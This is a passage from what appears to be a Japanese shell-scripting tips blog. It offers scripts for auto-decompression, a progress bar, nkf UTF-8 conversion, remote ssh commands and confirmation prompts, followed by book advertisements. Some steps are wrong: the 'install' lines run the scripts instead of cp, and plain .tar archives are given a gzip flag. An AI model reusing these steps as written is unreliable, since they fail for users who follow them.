```


実行結果
```
echo "      ほげ      " | trim ;
ほげ
```


### 並行して考える
　並列処理が可能なメソッドを積極的に書く


並列処理が可能なメソッドを積極的に書く


 メソッドの並列処理
```bash
#!/bin/bash

##
#
#
function cmd(){ 
  echo "Hello, $1!"; 
}
##
#
#
function sh_xargs(){
  export -f cmd
  yes | head -1000 | xargs -n1 -P4 -I % bash -c "cmd %"
}
##
#
#
sh_xargs ;
```


### 木を守る
　UNIXはドキュメントを忌み嫌う

UNIXユーザーは紙のドキュメントを忌み嫌う。不要なドキュメントを印刷して整理する事はしない。
ソースコードが実体であり、高水準のドキュメントとなるようプログラムする。



## 【自作コマンド】圧縮ファイル自動解凍ツール
圧縮されているファイルを、ファイルの拡張子にあわせて解凍すると言う作業は、日常的に多いものです。今回は、圧縮ファイルの拡張子を判断して自動的に解凍するシェルスクリプトを作成してみます。

### 圧縮ファイルと実行コマンド、パラメータ一覧

```bash

  拡張子           パラメータ
  tgz | tar.gz     tar zxvf  
  tar.Z            gunzip 
  tar.bz2          tar xvfj 
  tar              tar xvfz 
  gz               gunzip 
  Z                gunzip 
  bz2              bunzip2 
  zip              unzip 
```
こうしたコマンドやパラメータを覚えておくことは大切ですが、頭の経年劣化とともに、つい思い出すことができず、Googleで検索して調べると言ったことは、往々にしてあることです。


### 実行例
```bash
# 圧縮ファイルを解凍する便利な unCompコマンド
$ unComp comp.tar.gz2
```

### 作成
まずファイルを作ります。ファイル名は unComp とします
```bash
# unComp というファイルを作成
$ :> unComp 

# vim で unComp を開く
$ vim unComp
```

unCompファイルに以下の内容を貼り付ける

```bash
#!/bin/bash
#
#圧縮されているファイルを解凍する
# unComp を /usr/local/bin/にコピーすると
# 通常のコマンドとして本実行ファイルを利用する事が出来ます。
#
# cp unComp /usr/local/bin/unComp
#
# 実行例
# $ unComp filename(圧縮ファイル)
#
if [ $# -ne 1 ]; then
  echo ""
  exit ;
fi
#
case $1 in
  *.tgz | *.tar.gz)   tar zxvf $1 ;;
  *.tar.Z)            gunzip $1
                      tar xvf $( echo "$1" | sed 's/\.Z$//')
                      ;;
  *.tar.bz2)          tar xvfj $1;;
  *.tar)              tar xvfz $1;;
  *.gz)               gunzip $1;;
  *.Z)                gunzip $1;;
  *.bz2)              bunzip2 $1;;
  *.zip)              unzip $1;;
  *)                  echo "ファイルの拡張子が対応していません:$1"
esac
exit ;
```

作成したファイルには日本語が含まれているため、unCompファイルを UTF-8に変換しておきます。
[wLu](https://suzukiiichiro.github.io/posts/2021-12-23-suzuki/ "wLu")をつかってUTF-8に変換するとさらに便利です。

```bash
# unComp ファイルをnkf -wLu でUTF-8に変換
$ nkf -wLu unComp > unComp.txt

# unComp.txtをunCompにリネームします
$ mv unComp.txt unComp

# 作成したunCompコマンドファイルを/usr/local/bin にコピーします
$ sudo unComp /usr/local/bin/

# コマンドが配置されたかを確認
$ which unComp
$ /usr/local/bin/unComp
```

### 使い方

```bash
# 圧縮ファイルの拡張子を気にせずをコマンド一発で解凍する
# 実行
$ unComp sample.zip
```

圧縮ファイルの拡張子に併せたコマンドを思い出したり、さらにはコマンドのパラメータをGoogleで調べたりする必要が減ります。必要に応じて、ソースにコマンドやパラメータを追加すれば、さらに拡張できます。
便利ですね。


## 【自作コマンド】プログレスバーの作成
ターミナルで、処理の進捗が表示されるプログレスバーというのがあります。
処理が進むにつれて、ジリジリとメーターが右に増えていくあれです。
シェルスクリプトでも作れないものかとチャレンジしたので参考にして下さい

### 使い方

処理のループ中に以下の1行を追記します。
```bash
progress "$#" "$MAX"; set - "$@" count ;
```

### 実行手順
以下のソースコードを適当なファイル名で保存して下さい。ここではProgress.shとします。
```bash
$ :> Progress.sh
$ vim Progress.sh
# vimで以下のソースコードを貼り付けて保存
# ソースコードのファイルエンコードをUTF-8に変更します。
$ nkf -wLu Progress.sh > Progress.sh.utf8
# ファイルエンコードを変更したファイルを元のファイル名にリネームします。
$ mv Progress.sh.utf8 Progress.sh
# 実行権限を付与します
$ chmod +x Progress.sh
# 実行
$ ./Progress.sh
```

### ソースコード
```bash
#! /bin/bash

#######################################
# 進捗を表示するプログレスバー
#  
#######################################
#
#
# percent $1 
# GT      $2
progress(){

  percent=$1;
  GT=$2;  

  column=`expr 71 \* "$percent" / $GT`;
  nspace=`expr 71 - "$column"`;

  #プログレスバーのカーソルを左端に戻すリターンコードと[の文字をbarに代入
  bar='\r['; 

  #位置パラメータの数($#)を１にリセット（カウンタとして流用）
  set dummy ;
  while [ $# -le "$column" ];do
    bar=$bar'=';      # barに=を追加
    set - "$@" dummy; # $#をインクリメント
  done
  bar=$bar'>';        #barの先端に>を追加

  #位置パラメータの数($#)を１にリセット（カウンタとして流用）
  set dummy ;
  while [ $# -le "$nspace" ]; do 
    bar=$bar' ';
    set - "$@" dummy;
  done
  bar=$bar']'$percent/$GT'\c'; # barに]と１行分のプログレスバーを表示

  echo -e "$bar"; 
}

#######################################
# メイン処理
#
set count ;
MAX=100 ; #最大値を100とする。実際に掛かる処理数の最大値を入れて下さい。
#
for (( i=0; i<$MAX; i++)){
  # ループする処理に以下の一行を埋め込めばプログレスバーが表示されます。
  progress "$#" "$MAX"; set - "$@" count ;
}
echo "";
#
#終了
exit ;
```

### 使い方

シェルスクリプトで自作したなんらかの処理ファイルにprogress()関数を貼り付けます。

自作ソースの中のループ処理の関数の頭に以下を追記します。
MAX=100; は、処理の最大値を指定します。
処理のループ最大数が150回であれば、以下の通りに修正します。
```bash
set count;
MAX=150;
```
forやwhileループ処理の中に以下を埋め込みます。
```bash
progress "$#" "$MAX"; set - "$@" count ;
```

最後にforまたはwhileループを抜けた後に
```bash
echo "";
```

を追加します。これだけです。

### 実行結果
![](progress.gif "")



## 【自作コマンド】一時ファイルを作ることなく、ファイルの文字コードと改行コードをUTF-８に変換するスクリプト。

### 必要なもの
ネットワーク漢字フィルター nkf
※macの場合、[Homebrew](https://brew.sh/index_ja "Homebrew") が必要になります。

### nkf インストールの手順
まず、nkfがインストールされているかを確認します。
```bash
$ which nkf 
/usr/local/bin/nkf
```

インストールされていない場合、macの場合はbrewでインストールします。
```bash
$ brew install nkf 
```

インストールしようとすると以下のエラーが出ることがあります
```bash
Error: The `brew link` step did not complete successfully
The formula built, but is not symlinked into /usr/local
Could not symlink share/man/ja/man1/nkf.1
/usr/local/share/man/ja/man1 is not writable.

```

権限周りを下記のコマンドを打って変更します。
```bash
sudo chmod 775 /usr/local/share/man/ja/man1
sudo chown <ユーザ名>:admin /usr/local/share/man/ja/man1
```

コマンドを確認します。
```bash
$ nkf -v
Network Kanji Filter Version 2.1.5 (2018-12-15)
Copyright (C) 1987, FUJITSU LTD. (I.Ichikawa).
Copyright (C) 1996-2018, The nkf Project.
```

###  使い方
nkfコマンドとは？
「nkf」は「Network Kanji Filter」の略で、LinuxとWindowsなど、異なるOS間でテキストデータを交換する際に問題となる文字コードと改行コードを変換するためのコマンドです。

nkfコマンドの書式
nkf オプション ファイル名

UTF-8に変換する場合は、オプションに wLu をつけて変換します。
```bash
$ nkf -wLu isofile.txt > utf8.txt
```

### 変換の流れ（手動編）

元ファイル  moto.txt (UTF-8以外のファイルエンコード、改行コード）
  ↓
変換後のファイル ato.txt(UTF-8に変換したファイル）
  ↓
変換後のファイルをリネームする
```bash
# UTF-8に変換
$ nkf -wLu moto.txt > ato.txt

# 変換後のファイルを元のファイル名にリネームする
$ mv ato.txt moto.txt

# vimiでファイルエンコードを確認する
$ vim moto.txt
```

面倒ですね。ここで、一発でUTF-8に変換するコマンドを作成してみます。


###  変換の流れ（自動編）
```bash
# UTF-8に変換 wLu コマンドをこれから自作
# その後・・・

$ wLu moto.txt ← 一時ファイルすら作る必要なし
$ vim moto.txt ← UTF-8 に変換されている！
```

### コマンドの内容

まずファイルを作ります。ファイル名は wLu とします
```bash
# wLu というファイルを作成
$ :> wLu

# vim で wLu を開く
$ vim wLu 
```

以下の内容をファイルに貼り付ける

```bash
#!/bin/bash

#################################################
# パラメータで渡されたファイル名をutf8に変換する
#
# 使い方
# wLu UTF-8に変換したいファイル名
# wLu を /usr/local/bin/にコピーすると
# 通常のコマンドとして本実行ファイルを利用する事が出来ます。
#
#################################################
#
filename="$1" ;
#
function wLu(){
  if [ -f "$filename" ]; then
    cat "$filename" | nkf -wLu > "$filename".u ;
    mv "$filename".u "$filename" ;
  fi
}
#
if ! which nkf >/dev/null 2>&1; then
  echo "nkf がありません" ;
  echo "nkf をインストールして下さい" ; 
  exit ;
fi
#
if [ -z "$filename" ] ; then
  echo "第一引数にファイル名を指定して下さい"
  echo "実行例： wLu filename" ;  
  exit ;
fi
# 実行
wLu ;
# 終了
exit ;
```

作成したファイルには日本語が含まれているため、wLuファイルを UTF-8に変換しておきます。
```bash
# wLu ファイルをnkf -wLu でUTF-8に変換
$ nkf -wLu wLu > wLu.txt

# wLu.txtをwLuにリネームします
$ mv wLu.txt wLu

# 作成したwLuコマンドファイルを/usr/local/bin にコピーします
$ sudo wLu /usr/local/bin/

# コマンドが配置されたかを確認
$ which wLu
$ /usr/local/bin/wLu
```

### 使い方

```bash
# UTF-8以外のファイルエンコードファイル
$ cat moto.txt
$ wLu moto.txt
```

変換結果を一時ファイルにし、リネームする手間が省けます。
便利ですね。



## 【自作コマンド】sshでサーバーにログインしてコマンドを実行後、自動的にログアウトしてローカルに戻ってくる方法

sshでサーバーにログインして、なんらかのコマンドを実行しターミナルに表示、ミッション終了後、ターミナルを自動的にログアウトしてローカルに何事もなかったかのようにもどってくる最も簡単な方法ってなにかないでしょうか。

### イメージ

従来の方法

```bash
ローカルＰＣのターミナル

↓ Linuxサーバーにログイン

$df $uptime などを実行

↓ Linuxサーバーをログアウト

ローカルＰＣにもどる
```


これからつくるBash/ssh
```bash
ローカルＰＣのターミナル
↓ 
Linuxサーバーにログイン 
$df $uptime などを実行 
Linuxサーバーをログアウト
↓ 
ローカルＰＣのターミナルにもどる
```

わかりにくいですか？
まず、メリットとしてサーバーでコマンドからログアウトする必要がありません。
これができれば、一台一台サーバーのヘルスチェックをせずとも、数十台のサーバーを
順番に訪ね歩きファイルに出力する事も可能です。

以下、ソースです。

```bash
#!/usr/bin/bash

##############################################
# sshでサーバーにログインして、なんらかのコマンドを
# 実行しターミナルに表示、ミッション終了後、ターミ
# ナルを自動的にログアウトしてローカルに何事もなか
# ったかのようにもどってくる最も簡単シェルスクリプト
##############################################
#
# サーバーのＩＰアドレスとか
SERVER="centos@xx.xx.xx.xxx"
# 実行したいコマンドを && でつなぐ
COMMAND="uptime && df -h";

echo "centosサーバーログイン"; 

# ポイントは -t です。
ssh $SERVER  -t $COMMAND; 

echo "centosサーバーログアウト";

exit;
```

たったこれだけですが、この工夫により多くのサーバーを
スクリプトで一括回遊することができます。 お試しあれ。



## 【自作コマンド】シェルスクリプトで「キー入力待ち」プロンプトを実装する

説明も何もよくみるあれです。
```
実行しますか？ （y or N):
```

### 何かを押せば処理を続けたい場合
キーボードの入力さえあれば次に進むパターンもおなじみですね。
```bash
read -p "なにかキーを押してください"
```

### yを押せば処理を続け、Nでabort（終了）したい場合
これは覚えておくなりメモしておいたほうが良さそうです。
yを押せば次に進むし、Nであれば処理はabortします。

```bash
read -p "ok? (y/N): " yn
case "$yn" in [yY]*) ;; *) echo "abort." ; exit ;; esac
```

## 「ざっくり」シリーズのご紹介
【ちょいと便利な】シェルスクリプトワンライナー特集２【一行完結】
https://suzukiiichiro.github.io/posts/2023-01-11-01-oneliner-suzuki/
【ちょいと便利な】シェルスクリプトワンライナー特集【一行完結】
https://suzukiiichiro.github.io/posts/2022-11-30-01-oneliner-suzuki/

【TIPS】ざっくりわかるシェルスクリプト
https://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/
【ターミナルTIPS】ターミナルで知っておくとちょっとだけ便利なコマンド
https://suzukiiichiro.github.io/posts/2022-11-28-01-terminaltips-suzuki/

【名著紹介】「ＵＮＩＸという考え方」ご紹介
https://suzukiiichiro.github.io/posts/2022-11-07-01-theideaofunix-suzuki/

【アルゴリズム ソート比較】ざっくりわかるシェルスクリプト２０
https://suzukiiichiro.github.io/posts/2022-11-02-01-sortcomp-suzuki/
【アルゴリズム クイックソート】ざっくりわかるシェルスクリプト１９
https://suzukiiichiro.github.io/posts/2022-11-01-01-quicksort-suzuki/
【アルゴリズム シェルソート】ざっくりわかるシェルスクリプト１８
https://suzukiiichiro.github.io/posts/2022-10-27-01-shellsort-suzuki/
【アルゴリズム マージソート】ざっくりわかるシェルスクリプト１７
https://suzukiiichiro.github.io/posts/2022-10-19-01-mergesort-suzuki/
【アルゴリズム 連結リスト】ざっくりわかるシェルスクリプト１６
https://suzukiiichiro.github.io/posts/2022-10-18-01-list-suzuki/
【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５
https://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/
【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４
https://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/
【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３
https://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/
【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２
https://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/
【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１
https://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/
【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０
https://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/
【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９
https://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/
【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８
https://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/
【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７
https://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/ 
【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６
https://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/
【grep/sed/awkも】ざっくりわかるシェルスクリプト５
https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/
【grep特集】ざっくりわかるシェルスクリプト４
https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/
【はじめから】ざっくりわかるシェルスクリプト３
https://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/
【はじめから】ざっくりわかるシェルスクリプト２
https://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/
【はじめから】ざっくりわかるシェルスクリプト１
https://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/


## 書籍の紹介

{{% amazon

title="詳解 シェルスクリプト 大型本  2006/1/16"

url="https://www.amazon.co.jp/gp/proteect/4873112672/ref=as_li_tl?ie=UTF8&camp=247&creative=1211&creativeASIN=4873112672&linkCode=as2&tag=nlpqueens09-22&linkId=ef087fd92d3628bb94e1eb10cb202d43"

summary=`Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
`
imageUrl="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg"
%}}

{{% amazon

title="UNIXシェルスクリプト マスターピース132"

url="https://www.amazon.co.jp/gp/proteect/4797377623/ref=as_li_tl?ie=UTF8&camp=247&creative=1211&creativeASIN=4797377623&linkCode=as2&tag=nlpqueens09-22&linkId=3c8d4566263ae99374221c4f8f469154"

summary=`すべてのUNIXエンジニア必携!!

サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。
`
imageUrl="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg"
%}}


{{% amazon

title="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB+DB PRESS plus) 単行本（ソフトカバー）  2017/1/20"

url="https://www.amazon.co.jp/gp/proteect/4774186945/ref=as_li_tl?ie=UTF8&camp=247&creative=1211&creativeASIN=4774186945&linkCode=as2&tag=nlpqueens09-22&linkId=8ef3ff961c569212e910cf3d6e37dcb6"

summary=`定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。`
imageUrl="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg"
%}}

{{% amazon

title="新しいシェルプログラミングの教科書 単行本"

url="https://www.amazon.co.jp/gp/proteect/4797393106/ref=as_li_tl?ie=UTF8&camp=247&creative=1211&creativeASIN=4797393106&linkCode=as2&tag=nlpqueens09-22&linkId=f514a6378c1c10e59ab16275745c2439"

summary=`エキスパートを目指せ!!

システム管理やソフトウェア開発など、
実際の業務では欠かせないシェルスクリプトの知識を徹底解説

ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。
イマドキのエンジニア必携の一冊。

▼目次
CHAPTER01 シェルってなんだろう
CHAPTER02 シェルスクリプトとは何か
CHAPTER03 シェルスクリプトの基本
CHAPTER04 変数
CHAPTER05 クォーティング
CHAPTER06 制御構造
CHAPTER07 リダイレクトとパイプ
CHAPTER08 関数
CHAPTER09 組み込みコマンド
CHAPTER10 正規表現と文字列
CHAPTER11 シェルスクリプトの実行方法
CHAPTER12 シェルスクリプトのサンプルで学ぼう
CHAPTER13 シェルスクリプトの実用例
CHAPTER14 テストとデバッグ
CHAPTER15 読みやすいシェルスクリプト
`
imageUrl="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg"
%}}



